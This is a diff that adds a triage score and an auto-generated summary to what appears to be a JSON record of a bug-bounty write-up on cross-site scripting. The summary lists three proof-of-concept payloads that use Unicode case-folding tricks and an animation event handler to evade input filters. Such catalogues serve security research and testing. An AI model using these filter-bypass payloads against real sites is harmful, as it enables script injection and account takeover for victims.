@@ -18,5 +18,24 @@
   "source": {
     "fetched_at": "2026-04-24T13:23:57.211404+00:00",
     "http_status": 200
+  },
+  "triage": {
+    "ignored": false,
+    "value_score": 60,
+    "reasons": [
+      "yeswehack_community",
+      "has_payloads",
+      "some_howto"
+    ]
+  },
+  "summary": {
+    "vuln_point": "XSS: user-controlled data reaches an executable context in the browser due to missing/incorrect output encoding or sanitization.",
+    "poc": [
+      "Our input look like this: <ı onanimationſtart=\"alert(1)\" style=\"animation: A\"><ſtyle>@keyframes A{}</ſtyle>",
+      "<I ONANIMATIONSTART=\"ALERT(1)\" STYLE=\"ANIMATION: A\"><STYLE>@KEYFRAMES A{}</STYLE>",
+      "1name=<K id=template><ı onanimationſtart=\"alert(1)\" style=\"animation: A\" ><ſtyle>@keyframes A{}</ſtyle></K>"
+    ],
+    "impact": "Arbitrary JavaScript execution in victim browsers; can lead to account takeover actions depending on context.",
+    "notes": "Auto-summary based on stored fields (title/how_to_find/payloads)."
   }
 }
